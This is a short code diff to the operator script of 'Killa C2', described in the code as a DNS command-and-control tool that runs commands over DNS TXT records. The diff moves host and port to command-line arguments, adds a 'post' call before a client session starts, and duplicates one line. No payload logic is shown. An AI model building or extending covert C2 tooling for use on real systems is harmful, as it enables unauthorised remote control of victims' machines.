@@ -1,7 +1,7 @@
 import argparse
 import os
 
-from DNS import DNSServer
+from DNS import DNSServer, post
 
 def getArgs():
     parser = argparse.ArgumentParser(description='Killa C2 is a DNS C2 utilizing DNS TXT records to perform commmands')
@@ -26,10 +26,9 @@ def greet():
 
 
 def main():
-    #host, port = getArgs()
-    host = "192.168.7.168"
-    port = 53
+    host, port = getArgs()
     dns = DNSServer(port,host)
+    dns = DNSServer(port, host)
     greet()
     commands()
     choice = ""
@@ -45,6 +44,7 @@ def main():
             dns.showClients()
         elif choice == "connect":
             client = dns.select()
+            post()
             dns.start(client)
         elif choice == "help":
             commands()
